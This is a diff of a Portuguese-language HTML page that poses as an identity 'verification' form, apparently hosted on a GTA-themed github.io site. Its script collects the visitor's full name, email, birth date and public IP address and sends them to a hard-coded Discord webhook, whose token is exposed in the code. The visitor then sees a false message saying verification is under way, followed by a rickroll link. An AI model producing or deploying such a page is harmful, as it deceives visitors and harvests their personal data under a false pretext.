@@ -46,7 +46,7 @@
             font-size: 16px;
         }
         
-        button[type="submit"] {
+        button {
             background-color: #4CAF50;
             color: white;
             border: none;
@@ -58,11 +58,11 @@
             transition: background-color 0.3s;
         }
         
-        button[type="submit"]:hover {
+        button:hover {
             background-color: #45a049;
         }
         
-        .verification-screen {
+        .verification-screen, .error-screen {
             display: none;
             position: fixed;
             top: 0;
@@ -78,7 +78,7 @@
             padding: 20px;
         }
         
-        .verification-message {
+        .message {
             font-size: 20px;
             margin-bottom: 30px;
             max-width: 400px;
@@ -98,6 +98,13 @@
         
         .continue-button:hover {
             background-color: #CC0000;
+        }
+        
+        .loading {
+            display: none;
+            margin-top: 20px;
+            font-style: italic;
+            color: #666;
         }
     </style>
 </head>
@@ -120,89 +127,80 @@
                 <input type="date" id="birthDate" name="birthDate">
             </div>
             
-            <button type="submit">Verificar</button>
+            <button type="submit" id="submitBtn">Verificar</button>
+            <div class="loading" id="loading">Enviando dados...</div>
         </form>
     </div>
     
     <div class="verification-screen" id="verificationScreen">
-        <p class="verification-message">Você está sendo verificado. Enviaremos um email quando sua verificação for concluída.</p>
+        <p class="message">Você está sendo verificado. Enviaremos um email quando sua verificação for concluída.</p>
         <a href="https://youtu.be/dQw4w9WgXcQ" class="continue-button">Continuar</a>
+    </div>
+
+    <div class="error-screen" id="errorScreen">
+        <p class="message">Ocorreu um erro ao processar seu formulário. Por favor, tente novamente.</p>
+        <button class="continue-button" onclick="location.reload()">OK</button>
     </div>
 
     <script>
         document.getElementById('verificationForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
+            // Mostrar loading
+            document.getElementById('submitBtn').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+            
             // Coletar dados do formulário
             const formData = {
                 fullName: document.getElementById('fullName').value,
                 email: document.getElementById('email').value,
-                birthDate: document.getElementById('birthDate').value,
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent,
-                ip: await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip)
+                birthDate: document.getElementById('birthDate').value || 'Não informado',
+                timestamp: new Date().toLocaleString(),
+                ip: await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip).catch(() => 'Não detectado')
             };
             
-            // Enviar para webhook do Discord
-            const webhookURL = 'https://discord.com/api/webhooks/1390729092311158826/OoTfhqLaBBCxEjh3Wl3WC-3RVXuFUwTkoPwEKM53whnNxGsAZrvPdkD1jPVGsU5gS29m'; // Substitua pelo seu webhook
+            // Webhook do Discord fornecido
+            const webhookURL = 'https://discord.com/api/webhooks/1390729092311158826/OoTfhqLaBBCxEjh3Wl3WC-3RVXuFUwTkoPwEKM53whnNxGsAZrvPdkD1jPVGsU5gS29m';
             
-            const embed = {
-                title: "Novo formulário enviado",
-                color: 0x00ff00,
-                fields: [
-                    {
-                        name: "Nome completo",
-                        value: formData.fullName,
-                        inline: true
-                    },
-                    {
-                        name: "Email",
-                        value: formData.email,
-                        inline: true
-                    },
-                    {
-                        name: "Data de nascimento",
-                        value: formData.birthDate || "Não informado",
-                        inline: true
-                    },
-                    {
-                        name: "IP",
-                        value: formData.ip,
-                        inline: true
-                    },
-                    {
-                        name: "Dispositivo",
-                        value: formData.userAgent,
-                        inline: false
-                    },
-                    {
-                        name: "Horário",
-                        value: new Date(formData.timestamp).toLocaleString(),
-                        inline: true
-                    }
-                ]
-            };
-            
-            const payload = {
-                embeds: [embed]
+            // Formatar mensagem para o Discord
+            const discordMessage = {
+                content: '📄 **Novo formulário enviado**',
+                embeds: [{
+                    title: 'Dados do Formulário',
+                    color: 0x00ff00,
+                    fields: [
+                        { name: 'Nome completo', value: formData.fullName, inline: true },
+                        { name: 'Email', value: formData.email, inline: true },
+                        { name: 'Data de nascimento', value: formData.birthDate, inline: true },
+                        { name: 'IP', value: formData.ip, inline: true },
+                        { name: 'Data/Hora', value: formData.timestamp, inline: true }
+                    ],
+                    footer: { text: 'Formulário enviado via gtaSonline6.github.io' }
+                }]
             };
             
             try {
-                await fetch(webhookURL, {
+                // Enviar para o webhook do Discord
+                const response = await fetch(webhookURL, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
-                    body: JSON.stringify(payload)
+                    body: JSON.stringify(discordMessage)
                 });
                 
-                // Mostrar tela de verificação
-                document.getElementById('formContainer').style.display = 'none';
-                document.getElementById('verificationScreen').style.display = 'flex';
+                if (response.ok) {
+                    // Mostrar tela de verificação
+                    document.getElementById('formContainer').style.display = 'none';
+                    document.getElementById('verificationScreen').style.display = 'flex';
+                } else {
+                    throw new Error('Erro ao enviar para o Discord');
+                }
                 
             } catch (error) {
-                console.error('Erro ao enviar para o Discord:', error);
-                alert('Ocorreu um erro durante a verificação. Por favor, tente novamente.');
+                console.error('Erro:', error);
+                document.getElementById('formContainer').style.display = 'none';
+                document.getElementById('errorScreen').style.display = 'flex';
             }
         });
     </script>
